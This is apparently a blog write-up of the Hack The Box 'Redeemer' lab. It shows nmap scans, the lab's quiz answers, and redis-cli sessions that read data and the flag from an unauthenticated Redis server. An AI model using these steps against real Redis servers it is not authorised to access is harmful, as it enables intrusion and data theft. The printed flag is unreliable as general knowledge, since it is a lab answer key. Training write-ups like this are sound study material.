---
title: HTB - Redeemer Writeup - Linux ( Very Easy)
date: 2026-10-25 12:00:00 -0400
categories:
  - HTB
  - Linux(Very Easy)
tags:
  - htb
  - veryeasy
  - liunux
image:
  path: /assets/img/headers/Redeemer.png
  alt: HTB-meow
---



| Target Property  | Details                        |
| :--------------- | :----------------------------- |
| **Machine Name** | Redeemer                       |
| **Platform**     | Hack The Box (Very Easy Linux) |
| **Server IP**    | 10.129.24.148                  |
| **Open Ports**   | 6379                           |
| **Date Solved**  | 2026/10/25                     |




[Hack The Box - Redeemer](https://app.hackthebox.com/machines/Redeemer)


Port Scan
```
┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/2-Redeemer]
└─$ nmap -p- -vvv --min-rate 10000 redeemer.htb -oN nmap/redeemer_allport --open                                                                                                                                                                   
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-25 19:34 -0400
mass_dns: Using DNS server 192.168.4.1
mass_dns: Using DNS server fd0c:6c7b:e14c:1::1
Initiating Parallel DNS resolution of 1 host. at 19:34
Completed Parallel DNS resolution of 1 host. at 19:34, 0.00s elapsed
Initiating Ping Scan at 19:34
Scanning redeemer.htb (10.129.24.148) [4 ports]
Completed Ping Scan at 19:34, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:34
Completed Parallel DNS resolution of 1 host. at 19:34, 0.00s elapsed
Initiating SYN Stealth Scan at 19:34
Scanning redeemer.htb (10.129.24.148) [65535 ports]
Discovered open port 6379/tcp on 10.129.24.148
Completed SYN Stealth Scan at 19:34, 8.29s elapsed (65535 total ports)
Nmap scan report for redeemer.htb (10.129.24.148)
Host is up, received echo-reply ttl 63 (0.081s latency).
Scanned at 2026-10-25 19:34:05 EDT for 8s
Not shown: 62171 closed tcp ports (reset), 3363 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
6379/tcp open  redis   syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.51 seconds
           Raw packets sent: 81674 (3.594MB) | Rcvd: 63147 (2.526MB)





┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/2-Redeemer]
└─$ nmap -p 6379 -sCV redeemer.htb -oN nmap/redeemer.htb                                                                                                                                                                                           
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-25 19:34 -0400
Nmap scan report for redeemer.htb (10.129.24.148)
Host is up (0.080s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.68 seconds






```

What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database
Answer: `In-memory Database`


Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.
Answer: `redis-cli`


we can use to `redis-cli` connect to `redeemer.htb  `
```
┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/2-Redeemer]
└─$ redis-cli -h redeemer.htb                                                                                                                                                                                                                      
redeemer.htb:6379> 

```


check `redeemer.htb` server information. we can see redis server and Linux kernel version 
```
┌──(chako㉿kali)-[~/writeup/htb/veryeasy/linux/2-Redeemer]
└─$ redis-cli -h redeemer.htb                                                                                                                                                                                                                      
redeemer.htb:6379> help
redis-cli 8.0.6
To get help about Redis commands type:
      "help @<group>" to get a list of commands in <group>
      "help <command>" for help on <command>
      "help <tab>" to get a list of possible help topics
      "quit" to exit

To set redis-cli preferences:
      ":set hints" enable online hints
      ":set nohints" disable online hints
Set your preferences in ~/.redisclirc
redeemer.htb:6379> info
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:751
run_id:b82df4fae38575b5ab39a1ff09683018ae97787f
tcp_port:6379
uptime_in_seconds:901
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:14586709
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0
....
....

```


lets check the redis keys and we get the flag
```
db0:keys=4,expires=0,avg_ttl=0
redeemer.htb:6379> INFO keyspace
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
redeemer.htb:6379> 
redeemer.htb:6379> KEYS *
1) "flag"
2) "temp"
3) "numb"
4) "stor"
redeemer.htb:6379> 
redeemer.htb:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
redeemer.htb:6379> 

```